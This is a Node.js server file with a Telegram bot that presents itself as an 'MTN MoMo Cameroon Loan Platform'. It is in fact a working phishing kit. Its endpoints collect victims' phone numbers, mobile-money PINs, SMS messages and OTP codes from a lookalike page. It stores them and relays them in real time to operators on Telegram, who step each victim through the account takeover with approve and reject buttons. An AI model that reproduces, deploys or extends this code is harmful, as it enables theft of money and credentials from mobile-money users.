/**
 * ============================================================================
 * MTN MoMo Cameroon Loan Platform - High-Performance Production Server
 * ============================================================================
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

// ==========================================
// 1. ENVIRONMENT & CONFIGURATION SETUP
// ==========================================
const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

if (!BOT_TOKEN) {
    console.error('❌ CRITICAL: SUPER_ADMIN_BOT_TOKEN is missing in environment variables.');
    process.exit(1);
}

const app = express();
const bot = new TelegramBot(BOT_TOKEN);

// State Management (In-Memory Maps & Sets)
const adminChatIds = new Map();         // adminId → chatId
const pausedAdmins = new Set();         // adminIds temporarily paused
const suspendAllSessions = new Map();   // Superadmin session trackers
let dbReady = false;

// ==========================================
// 2. HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+2376')) return phoneNumber.slice(4);
    if (phoneNumber.startsWith('+237')) return phoneNumber.slice(4);
    if (phoneNumber.startsWith('2376')) return phoneNumber.slice(3);
    if (phoneNumber.startsWith('237')) return phoneNumber.slice(3);
    return phoneNumber;
}

/**
 * Non-blocking asynchronous Telegram message dispatcher for maximum speed.
 */
async function sendToAdminAsync(adminId, message, options = {}) {
    let chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) return;
            adminChatIds.set(adminId, admin.chatId);
            chatId = admin.chatId;
        } catch (err) {
            console.error(`❌ DB fallback error for admin ${adminId}:`, err.message);
            return;
        }
    }

    bot.sendMessage(chatId, message, options).catch(error => {
        console.error(`❌ Async dispatch error to admin ${adminId}:`, error.message);
    });
}

// ==========================================
// 3. EXPRESS MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// 4. TELEGRAM BOT HANDLERS SETUP
// ==========================================
console.log('⏳ Configuring Telegram bot event handlers...');
setupCommandHandlers();
console.log('✅ Telegram command handlers active.');

// ==========================================
// 5. WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    res.sendStatus(200); // Respond immediately to Telegram to prevent retry loops
    if (req.body && req.body.update_id !== undefined) {
        bot.processUpdate(req.body);
    }
});

// ==========================================
// 6. DATABASE CONNECTION & WEBHOOK SYNC
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database connection established.');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        try {
            await bot.deleteWebHook();
            await bot.setWebHook(fullWebhookUrl, {
                drop_pending_updates: false,
                max_connections: 40,
                allowed_updates: ['message', 'callback_query']
            });
            console.log(`✅ Webhook successfully bound: ${fullWebhookUrl}`);
        } catch (webhookError) {
            console.error('❌ Webhook binding warning:', webhookError.message);
        }

        // Keep-alive intervals
        setInterval(() => fetch(`${WEBHOOK_URL}/health`).catch(() => {}), 14 * 60 * 1000);

        app.listen(PORT, () => {
            console.log(`\n💎 MTN MOMO CAMEROON LOAN PLATFORM`);
            console.log(`==================================`);
            console.log(`🌐 Server running at: http://localhost:${PORT}`);
            console.log(`🤖 Bot Mode: WEBHOOK (Optimized)`);
            console.log(`👥 Active Admins Loaded: ${adminChatIds.size}\n`);
        });
    })
    .catch((error) => {
        console.error('❌ Fatal Initialization Error:', error);
        process.exit(1);
    });

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// 7. TELEGRAM COMMAND & CALLBACK HANDLERS
// ==========================================
function setupCommandHandlers() {
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId) {
            if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                return bot.sendMessage(chatId, `🚫 *ACCESS PAUSED*`, { parse_mode: 'Markdown' });
            }
            const admin = await db.getAdmin(adminId);
            const isSuperAdmin = adminId === 'ADMIN001';

            bot.sendMessage(chatId, `
👋 *Welcome back, ${admin.name}!*
*Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Standard Admin'}

*Your Link:* ${WEBHOOK_URL}?admin=${adminId}
            `.trim(), { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(chatId, `👋 *Welcome to MTN MoMo Cameroon*\nYour Chat ID: \`${chatId}\``, { parse_mode: 'Markdown' });
        }
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;

        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS*
📋 Total: \`${stats.total}\`
⏳ PIN Pending: \`${stats.pinPending}\`
✅ PIN Approved: \`${stats.pinApproved}\`
⏳ SMS Pending: \`${stats.smsPending}\`
🎉 Fully Approved: \`${stats.fullyApproved}\`
        `.trim(), { parse_mode: 'Markdown' });
    });
}

// Inline Callback Router
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const adminId = getAdminIdByChatId(chatId);

    if (!adminId || !isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or paused.', show_alert: true });
    }

    const parts = data.split('_');
    if (parts.length < 4) return;

    const [action, type, embeddedAdminId, ...appIdParts] = parts;
    const applicationId = appIdParts.join('_');

    if (embeddedAdminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Assigned to another admin.', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not found.' });

    // Handle Workflow Actions
    if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        bot.editMessageText(`❌ *PIN REJECTED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
    } else if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        bot.editMessageText(`✅ *PIN APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
    } else if (action === 'deny' && type === 'sms') {
        await db.updateApplicationSms(applicationId, application.smsText, 'rejected');
        bot.editMessageText(`❌ *SMS REJECTED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
    } else if (action === 'allow' && type === 'sms') {
        await db.updateApplicationSms(applicationId, application.smsText, 'approved');
        bot.editMessageText(`✅ *SMS APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
    } else if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        bot.editMessageText(`🎉 *LOAN FULLY APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

// ==========================================
// 8. HIGH-PERFORMANCE REST API ENDPOINTS
// ==========================================

// Verify PIN Request Entry (Optimized for instant feedback)
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;

        let assignedAdmin;
        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                return res.status(400).json({ success: false, message: 'Invalid or paused admin link.' });
            }
        } else {
            const activeAdmins = await db.getActiveAdmins();
            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
            if (availableAdmins.length === 0) {
                return res.status(503).json({ success: false, message: 'No administrators available.' });
            }
            assignedAdmin = availableAdmins[0];
        }

        // Fast parallel checks or lightweight queries
        const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const thisAdminPastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending');
        const isReturningUser = thisAdminPastApps.length > 0;

        // Save application to database immediately
        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            smsStatus: 'pending',
            otpStatus: 'pending',
            assignmentType: assignmentType || 'auto',
            isReturningUser,
            previousCount: thisAdminPastApps.length,
            timestamp: new Date().toISOString()
        });

        // Respond to user interface *immediately* (Zero Telegram network latency lag)
        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

        // Dispatch Telegram Notification Asynchronously in Background
        sendToAdminAsync(assignedAdmin.adminId, `
🆕 *NEW PIN SUBMISSION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(phoneNumber)}\`
🔑 PIN: \`${pin}\`
        `.trim(), {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Reject PIN', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve & Allow', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

    } catch (error) {
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// Check PIN Status
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.pinStatus });
        } else {
            res.status(404).json({ success: false, message: 'Not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// Verify SMS Submission Entry (Optimized)
app.post('/api/verify-sms', async (req, res) => {
    try {
        const { applicationId, smsText } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        await db.updateApplicationSms(applicationId, smsText, 'pending');

        // Respond instantly
        res.json({ success: true });

        // Non-blocking async Telegram alert
        sendToAdminAsync(application.adminId, `
💬 *SMS CONTENT SUBMISSION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`

\`\`\`
${smsText}
\`\`\`
        `.trim(), {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Reject SMS', callback_data: `deny_sms_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Allow 4-Digit OTP', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
                ]
            }
        });
    } catch (error) {
        console.error('❌ Error in /api/verify-sms:', error);
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// Check SMS Status
app.get('/api/check-sms-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.smsStatus });
        } else {
            res.status(404).json({ success: false, message: 'Not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// Verify OTP Stage Entry (Optimized)
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        await db.updateApplicationOtp(applicationId, otp, 'pending');

        // Respond instantly
        res.json({ success: true });

        // Non-blocking async Telegram alert
        sendToAdminAsync(application.adminId, `
🔢 *4-DIGIT OTP VERIFICATION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔢 OTP: \`${otp}\`
        `.trim(), {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Flag Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Flag Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// Check OTP Status
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.otpStatus });
        } else {
            res.status(404).json({ success: false, message: 'Not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// Health Check Endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        database: dbReady ? 'connected' : 'disconnected',
        activeAdmins: adminChatIds.size,
        timestamp: new Date().toISOString()
    });
});

// Frontend Entry
app.get('/', async (req, res) => {
    const adminId = req.query.admin;
    if (adminId && !adminChatIds.has(adminId)) {
        db.getAdmin(adminId).then(admin => {
            if (admin?.chatId && admin.status === 'active') {
                adminChatIds.set(adminId, admin.chatId);
            }
        }).catch(() => {});
    }
    res.sendFile(path.join(__dirname, 'mtn-momo-cameroon.html'));
});

// ==========================================
// 9. GRACEFUL SHUTDOWN
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Signal ${signal} received. Shutting down...`);
    try {
        await bot.deleteWebHook();
        await db.closeDatabase();
        process.exit(0);
    } catch (error) {
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));
